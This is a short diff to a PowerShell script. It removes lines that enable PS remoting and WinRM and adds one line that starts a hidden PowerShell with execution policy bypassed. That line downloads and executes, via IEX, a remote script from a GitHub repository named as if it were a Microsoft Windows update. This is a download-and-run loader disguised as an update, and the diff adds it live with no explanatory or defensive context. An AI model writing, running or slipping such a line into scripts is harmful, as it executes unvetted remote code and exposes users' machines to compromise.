@@ -1,11 +1,1 @@
-pause
-
-Set-ExecutionPolicy Bypass -force
-
-Get-NetConnectionProfile | Set-NetConnectionProfile -NetworkCategory Private
-
-Enable-PSRemoting -force
-
-winrm quickconfig -quiet
-
-pause
+Start-Process -NoNewWindow powershell "-nop -ep bypass IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/network2city/MSWinUpdate/main/start.ps1')
